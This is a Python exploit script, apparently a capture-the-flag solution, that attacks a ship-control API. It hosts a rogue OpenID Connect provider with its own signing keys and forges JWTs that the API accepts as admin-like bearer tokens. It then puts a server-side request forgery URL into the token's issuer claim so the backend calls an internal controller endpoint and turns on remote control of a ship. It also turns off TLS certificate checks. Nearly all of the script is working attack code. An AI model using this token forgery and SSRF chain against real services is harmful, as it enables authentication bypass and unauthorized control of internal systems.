"""
Requires: pip install cryptography requests
Set HOST_URL to an HTTP(S) URL reachable by the challenge API.
"""

import base64
import json
import os
import threading
import time
import urllib3
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse

import requests
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa


HOST_URL = os.environ.get("HOST_URL")
LISTEN_HOST = os.environ.get("LISTEN_HOST", "0.0.0.0")
LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "8000"))
API_URL = "https://api.ships.damoverflow.com/api/ships"

if not HOST_URL:
    raise ValueError("HOST_URL environment variable must be set")
HOST_URL = HOST_URL.rstrip("/")

KEY_ID = uuid.uuid4().hex
PRIVATE_KEY = rsa.generate_private_key(public_exponent=65537, key_size=2048)
PUBLIC_NUMBERS = PRIVATE_KEY.public_key().public_numbers()


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def _base64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _base64url_uint(value: int) -> str:
    byte_length = (value.bit_length() + 7) // 8
    return _base64url(value.to_bytes(byte_length, "big"))


JWKS = {
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "alg": "RS256",
            "kid": KEY_ID,
            "n": _base64url_uint(PUBLIC_NUMBERS.n),
            "e": _base64url_uint(PUBLIC_NUMBERS.e),
        }
    ]
}

OPENID_CONFIGURATION = {
    "issuer": HOST_URL,
    "authorization_endpoint": f"{HOST_URL}/protocol/openid-connect/auth",
    "token_endpoint": f"{HOST_URL}/protocol/openid-connect/token",
    "userinfo_endpoint": f"{HOST_URL}/protocol/openid-connect/userinfo",
    "jwks_uri": f"{HOST_URL}/protocol/openid-connect/certs",
    "response_types_supported": ["code", "token", "id_token"],
    "subject_types_supported": ["public"],
    "id_token_signing_alg_values_supported": ["RS256"],
    "claims_supported": [
        "iss",
        "sub",
        "aud",
        "exp",
        "iat",
        "auth_time",
        "name",
        "given_name",
        "family_name",
        "preferred_username",
        "email",
        "acr",
        "azp",
    ],
}


def create_token() -> str:
    now = int(time.time())
    claims = {
        "exp": now + 3600,
        "iat": now,
        "auth_time": now,
        "jti": f"onrtac:{uuid.uuid4()}",
        "iss": HOST_URL,
        "aud": ["controller-plus-api", "account"],
        "sub": str(uuid.uuid4()),
        "typ": "Bearer",
        "azp": "controller-plus-ui",
        "sid": uuid.uuid4().hex,
        "acr": "1",
        "allowed-origins": ["https://ships.damoverflow.com"],
        "realm_access": {
            "roles": [
                "default-roles-controller-plus",
                "offline_access",
                "uma_authorization",
            ]
        },
        "resource_access": {
            "account": {
                "roles": ["manage-account", "manage-account-links", "view-profile"]
            }
        },
        "scope": "openid email profile",
        "email_verified": False,
        "name": "asd asd",
        "preferred_username": "admin",
        "given_name": "asd",
        "family_name": "asd",
        "email": "asd@asd",
    }
    header = {"alg": "RS256", "typ": "JWT", "kid": KEY_ID}
    encoded_header = _base64url(json.dumps(header, separators=(",", ":")).encode())
    encoded_claims = _base64url(json.dumps(claims, separators=(",", ":")).encode())
    signing_input = f"{encoded_header}.{encoded_claims}"
    signature = PRIVATE_KEY.sign(
        signing_input.encode("ascii"),
        padding.PKCS1v15(),
        hashes.SHA256(),
    )
    return f"{signing_input}.{_base64url(signature)}"


def create_ssrf_token(ship_id: str) -> str:
    ssrf_url = f"http://controller_api:80/api/ships/{ship_id}/remote-control?_method=PUT&enabled=true&other="
    
    now = int(time.time())
    claims = {
        "exp": now + 3600,
        "iat": now,
        "auth_time": now,
        "jti": f"onrtac:{uuid.uuid4()}",
        "iss": ssrf_url,
        "aud": ["controller-plus-api", "account"],
        "sub": str(uuid.uuid4()),
        "typ": "Bearer",
        "azp": "controller-plus-ui",
        "sid": uuid.uuid4().hex,
        "acr": "1",
        "allowed-origins": ["https://ships.damoverflow.com"],
        "realm_access": {
            "roles": [
                "default-roles-controller-plus",
                "offline_access",
                "uma_authorization",
            ]
        },
        "resource_access": {
            "account": {
                "roles": ["manage-account", "manage-account-links", "view-profile"]
            }
        },
        "scope": "openid email profile",
        "email_verified": False,
        "name": "asd asd",
        "preferred_username": "admin",
        "given_name": "asd",
        "family_name": "asd",
        "email": "asd@asd",
    }
    header = {"alg": "RS256", "typ": "JWT", "kid": KEY_ID}
    encoded_header = _base64url(json.dumps(header, separators=(",", ":")).encode())
    encoded_claims = _base64url(json.dumps(claims, separators=(",", ":")).encode())
    signing_input = f"{encoded_header}.{encoded_claims}"
    signature = PRIVATE_KEY.sign(
        signing_input.encode("ascii"),
        padding.PKCS1v15(),
        hashes.SHA256(),
    )
    return f"{signing_input}.{_base64url(signature)}"


def get_ships(token: str):
    response = requests.get(
        API_URL,
        headers={"Authorization": f"Bearer {token}", "Accept": "application/json"},
        timeout=15,
        verify=False
    )
    print(f"API response (HTTP {response.status_code})")
    payload = response.json()
    return payload


class OidcHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        path = urlparse(self.path).path
        if path == "/.well-known/openid-configuration":
            self._send_json(OPENID_CONFIGURATION)
        elif path == "/protocol/openid-connect/certs":
            self._send_json(JWKS)
        else:
            self.send_error(404, "Not found")

    def _send_json(self, payload: dict) -> None:
        body = json.dumps(payload, separators=(",", ":")).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)


def main() -> None:
    # Start HTTP server hosting the OIDC metadata and JWKS endpoints
    server = ThreadingHTTPServer((LISTEN_HOST, LISTEN_PORT), OidcHandler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    
    # Forge a JWT token for authentication
    token = create_token()
    print(f"Serving OIDC metadata at {HOST_URL}/.well-known/openid-configuration")
    print(f"Serving JWKS at {HOST_URL}/protocol/openid-connect/certs")
    print("Bearer token:")
    print(token)
    
    # Use the forged JWT token to get list of ships (including first flag)
    print(f"\nRequesting {API_URL}...")
    ships = get_ships(token)
    
    flag_1_ship = [
        ship
        for ship in ships
        if 'cybersci' in ship.get('name')
    ][0]
    print(json.dumps(flag_1_ship, indent=2))
    print()
    
    flag_1 = flag_1_ship['name']
    print(f'Flag 1: {flag_1}')
    print()
    
    # Forge a JWT token with SSRF URL in iss claim
    valid_ship_id = flag_1_ship['id']
    ssrf_token = create_ssrf_token(valid_ship_id)
    
    # Send any request with the SSRF JWT token
    try:
        get_ships(ssrf_token)
    except:
        pass
    
    # Wait for simulator to update and receive the remote control command
    print("Waiting for simulator to update and receive the remote control command...")
    time.sleep(10)
    
    # Fetch ships to get the second flag
    print(f"\nRequesting {API_URL}...")
    ships = get_ships(token)
    
    flag_2_ship = [
        ship
        for ship in ships
        if 'cybersci' in ship.get('name') and ship.get('name') != flag_1
    ][0]
    print(json.dumps(flag_2_ship, indent=2))
    print()

    flag_2 = flag_2_ship['name']
    print(f'Flag 2: {flag_2}')
    print()

    server.shutdown()
    server.server_close()


if __name__ == "__main__":
    main()
